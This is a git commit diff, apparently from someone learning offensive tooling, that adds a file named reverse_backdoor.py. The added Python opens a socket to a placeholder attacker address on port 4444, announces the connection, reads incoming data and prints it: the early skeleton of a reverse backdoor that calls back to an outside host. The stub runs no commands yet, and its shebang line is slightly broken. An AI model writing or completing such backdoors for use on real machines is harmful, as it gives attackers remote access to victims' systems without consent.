9621d9ad0aad7c09820f57c2c262bfa7f0487f0a
kali-ninja <kali-ninja@kali-ninja.kali-ninja>
2025-03-26 17:29:17 +0100

    wip c1

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,1 +1,12 @@
 #!/usr/bin/ env python
+import socket
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("xx.x.x.xx", 4444))
+
+connection.send("\n[+] Connection established.\n")
+
+received_data = connection.recv(1024)
+print(received_data)
+
+connection.close()
